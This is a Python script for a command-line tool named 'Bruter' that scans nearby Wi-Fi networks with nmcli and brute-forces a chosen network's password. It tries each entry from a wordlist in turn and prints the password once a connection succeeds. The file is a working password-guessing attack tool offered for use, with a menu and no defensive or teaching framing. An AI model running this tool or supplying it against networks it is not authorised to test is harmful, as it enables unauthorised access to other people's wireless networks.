import subprocess
import time


class Bruter:
    def __init__(self):
        self.debug = True

    def check_wifi_status(self):
        wifi_status = subprocess.Popen(["nmcli","radio", "wifi"], stdout=subprocess.PIPE)
        output, error = wifi_status.communicate()
        if output == b"disabled\n":
           subprocess.Popen(["nmcli","radio", "wifi","on"]).communicate()[0]
           print("Wi-Fi status was disabled, enabling now...")
        if output == b"enabled\n":
           print("Wi-Fi status enabled, Wi-Fi scanner starting...")

    def scan_wifi(self):
        print("Checking wifi-status")
        self.check_wifi_status()
        time.sleep(1)
        subprocess.Popen(["nmcli","dev", "wifi", "list"]).communicate()[0]

    def rescan_wifi(self):
        subprocess.Popen(["nmcli", "dev", "wifi", "list", "--rescan", "yes"]).communicate()[0]

    def connect_to_wifi(self,ssid, password):
        status = subprocess.Popen(["nmcli", "dev", "wifi", "connect", f"{ssid}", "password", f"{password}"], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        output, error = status.communicate()
        if b"Error" in error:
            print("Non successfull candidate")
        if b"Connection activation failed" in error:
            print("Possible candidate try manually connecting with that password!")
        if b"successfully activated with" in output:
            print(f"Password found {password}")

    def brute_force(self,ssid, wordlist):
        wordlist = open(wordlist, "r")
        possible_passwords=wordlist.readlines()
        for password in possible_passwords:
            password = password.replace("\n", "")
            print(f"Trying password", f"{password}")
            time.sleep(0.5)
            self.connect_to_wifi(ssid, password)


if __name__ == '__main__':
    bruter = Bruter()
    print("""
######                                    
#     # #####  #    # ##### ###### #####  
#     # #    # #    #   #   #      #    # 
######  #    # #    #   #   #####  #    # 
#     # #####  #    #   #   #      #####  
#     # #   #  #    #   #   #      #   #  
######  #    #  ####    #   ###### #    #

    1) Scan Wi-Fi
    2) Brute-Force Wi-Fi
    3) Exit""")

    while True:
        option = int(input("#>  "))

        if option == 1:
           bruter.scan_wifi()
           time.sleep(5)
           print("Scanner will automatically scan after 5 seconds")
           bruter.rescan_wifi()

        if option == 2:
           ssid = str(input("Enter SSID: "))
           password = input("Enter Wordlist Path: ") 
           bruter.brute_force(ssid, password)

        if option == 3:
           exit() 
